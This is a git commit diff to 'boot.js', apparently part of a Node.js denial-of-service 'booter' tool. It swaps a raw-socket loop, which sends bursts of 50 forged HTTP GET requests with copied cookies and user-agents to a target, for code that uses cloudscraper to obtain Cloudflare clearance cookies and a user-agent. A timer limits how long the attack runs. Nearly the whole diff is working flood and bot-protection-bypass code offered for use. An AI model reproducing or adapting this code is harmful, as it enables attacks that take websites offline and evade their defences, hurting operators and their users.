b565d7d638a7b18db5a40e6875540f0405dc19dc
Nitrix <120071588+nitrixdev@users.noreply.github.com>
2023-02-05 23:29:56 -0500

    Update boot.js

--- boot.js
+++ boot.js
@@ -33,17 +33,19 @@ var counter = 0;
 var int = setInterval(() => {
 	if (cookie !== '' && ua !== '') {
 		var s = require('net').Socket();
-		s.connect(80, host);
-		s.setTimeout(10000);
-		for (var i = 0; i < 50; i++) {
-			s.write('GET ' + target + '/ HTTP/1.1\r\nHost: ' + host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*//*;q=0.8\r\nUser-Agent: ' + ua + '\r\nUpgrade-Insecure-Requests: 1\r\nCookie: ' + cookie + '\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\ncache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
+		cloudscraper.get(target, function (error, response) {
+	if (error) {
+	} else {
+		var parsed = JSON.parse(JSON.stringify(response));
+		cookie = (parsed["request"]["headers"]["cookie"]);
+		if (cookie == undefined) {
+			cookie = (parsed["headers"]["set-cookie"]);
 		}
-		s.on('data', function () {
-			setTimeout(function () {
-				s.destroy();
-				return delete s;
-			}, 5000);
-		})
+		ua = (parsed["request"]["headers"]["User-Agent"]);
+	}
+	console.log('Received tokens!')
+	console.log(cookie + '/' + ua);
+});
 	}
 });
 setTimeout(() => clearInterval(int), time * 1000);
